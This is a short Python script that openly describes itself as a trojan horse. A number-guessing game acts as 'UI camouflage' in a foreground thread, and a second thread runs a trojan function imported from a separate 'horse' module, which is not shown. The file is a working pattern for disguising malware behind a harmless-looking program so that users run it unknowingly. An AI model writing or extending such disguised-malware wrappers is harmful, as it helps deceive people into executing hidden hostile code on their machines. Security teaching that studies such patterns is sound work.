"""
Covering Of Trojan Horse
"""

from horse import trojan
import random
import threading

def game():
    """
    UI Camouflage Of Trojan Horse
    """
    number = random.randint(0, 1000)
    tries = 1
    done = False

    while not done:
        guess = int(input("Guess the number between 0 and 1000"))
        if guess == number: 
            done = True 
            print("You Won!")
        else:
            tries += 1 
            print("Try again")
    print(f"You guessed in {tries} tries")


# Parrallel run of malware and UI

t1 = threading.Thread(target=game)  # Foreground
t2 = threading.Thread(target=trojan)  # Background
# // Execution of trojan and game
t1.start()
t2.start()
